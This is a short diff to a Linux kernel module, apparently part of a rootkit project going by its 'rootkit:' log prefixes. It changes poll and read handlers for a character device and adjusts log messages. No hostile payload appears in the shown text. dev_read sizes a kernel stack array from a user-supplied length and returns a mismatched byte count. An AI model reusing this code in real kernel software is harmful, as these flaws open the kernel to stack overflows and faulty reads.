@@ -76,7 +76,7 @@ static unsigned int dev_poll(struct file *file, poll_table *wait) {
     poll_wait(file, &rootkit_wait, wait);
 
     // you should return POLLIN | POLLRDNORM if you have some new data to read, and 0 in case there is no new data to read
-    if (data_ready) {
+    if (data_ready == 1) {
         printk(KERN_INFO "rootkit: Data ready!");
         data_ready = 0;
         return POLLIN | POLLRDNORM;
@@ -189,6 +189,7 @@ static int dev_open(struct inode *inodep, struct file *filep){
  *  @param offset The offset if required
  */
 static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset) {
+    printk(KERN_INFO "rootkit: Read\n");
     int error_count = 0;
 
     u32 vals[len];
@@ -200,7 +201,7 @@ static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *of
     error_count = copy_to_user(buffer, vals, len*4);
 
     if (error_count == 0) {
-        printk(KERN_INFO "rootkit: Sent test message to the user\n");
+        printk(KERN_INFO "rootkit: Sent data to the user\n");
         return len + 1; // Return bytes read so the user space program knows data arrived
     } else {
         printk(KERN_ALERT "rootkit: Failed to send characters to the user\n");
